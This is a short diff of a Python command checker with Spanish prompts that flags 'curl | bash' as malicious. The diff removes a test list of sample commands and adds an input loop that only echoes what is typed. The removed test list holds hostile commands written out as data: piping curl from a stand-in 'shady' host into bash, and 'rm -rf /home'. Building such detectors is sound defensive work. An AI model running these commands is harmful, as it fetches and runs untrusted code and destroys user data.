@@ -28,12 +28,9 @@ def analyze_command(command):
     if len(parts) > 1 and "curl" in parts[0] and "bash" in parts[1]:
         return "malicious - descarga y ejecución directa"
     return "safe"
-# Test
-test_commands = [
-    "curl http://example.com | bash",
-    "curl https://google.com",
-    "rm -rf /home",
-    "curl http://shady.com | bash"
-]
-for cmd in test_commands:
-    print(f"Command: {cmd} -> {analyze_command(cmd)}")
+
+while True:
+    command =  input("Ingresa un comando o 'salir' para terminar:")
+    if command.lower() == 'salir':
+        break
+    print(f"Comando ingresado:: {command}")
